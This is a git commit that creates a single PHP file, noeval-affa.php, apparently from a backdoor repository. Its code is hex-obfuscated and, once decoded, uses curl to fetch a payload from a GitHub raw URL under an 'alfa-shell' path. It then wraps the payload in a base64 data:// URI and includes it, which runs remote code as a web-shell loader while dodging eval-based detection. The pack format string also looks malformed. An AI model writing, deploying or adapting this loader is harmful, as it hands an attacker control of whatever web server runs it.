60a8935b05f743dd3162d612a709acd5cda73b68
dzbackdor <141788825+Dzbackdor@users.noreply.github.com>
2025-08-09 02:32:29 +0700

    Create noeval-affa.php

---
+++ noeval-affa.php
@@ -0,0 +1,26 @@
+<?php
+function x($h){return pack('Dz*',$h);}
+$dmorjkn = x("6375726c5f696e6974");
+$rkfw = x("6375726c5f7365746f7074");
+$eznjdcz = x("6375726c5f65786563");
+$nmlxjm = x("6375726c5f636c6f7365");
+$ptng = x("6261736536345f656e636f6465");
+$ftus = constant(x("4355524c4f50545f55524c"));
+$cywg = constant(x("4355524c4f50545f52455455524e5452414e53464552"));
+
+Dzone3844:
+goto Dzone9210;
+Dzone9210:
+$fqmp = x("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f447a6261636b646f722f616e6f6e796d6f75732f726566732f68656164732f6d61696e2f616c66612d7368656c6c2f6261797061737333");
+
+$uuvoqi = $dmorjkn();
+$rkfw($uuvoqi, $ftus, $fqmp);
+$rkfw($uuvoqi, $cywg, true);
+$ktmwk = $eznjdcz($uuvoqi);
+$nmlxjm($uuvoqi);
+
+if(!$ktmwk) exit('Network error');
+
+$pdwnua = $ptng($ktmwk);
+$rvhjm = x("646174613a2f2f746578742f706c61696e3b6261736536342c") . $pdwnua;
+include $rvhjm;
